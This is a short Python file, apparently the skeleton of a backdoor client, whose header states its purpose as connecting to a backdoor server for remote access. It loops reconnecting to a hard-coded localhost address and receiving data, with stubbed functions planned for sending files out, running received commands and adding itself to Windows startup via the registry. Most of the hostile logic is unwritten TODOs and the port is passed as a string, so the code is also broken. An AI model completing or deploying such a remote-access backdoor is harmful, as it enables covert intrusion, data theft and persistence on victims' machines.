'''
    author  : zerobits01
    created : 25-Jan-2020
    modified: 28-Jan-2020
    purpose : connecting to backdoor server and gives us remote access
'''

import socket
import subprocess
import json
import time

HOST = lambda : '127.0.0.1'
PORT = lambda : '0101'

def saveFile():
    # TODO : get the json data and write it binary
    pass

def sendFile():
    # TODO : get the path and read the file and send it as json
    pass

def execute():
    # TODO : get the command and execute and return output
    pass

def winAddReg():
    # TODO : copy this file in appdata and add this to reg(startup)
    pass

while True:
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
        while True:
            try:
                s.connect((HOST(), PORT()))
                break
            except Exception:
                time.sleep(10)

        while True :
            data = s.recv(1024)
            # TODO : check the input and
            #  return the expected response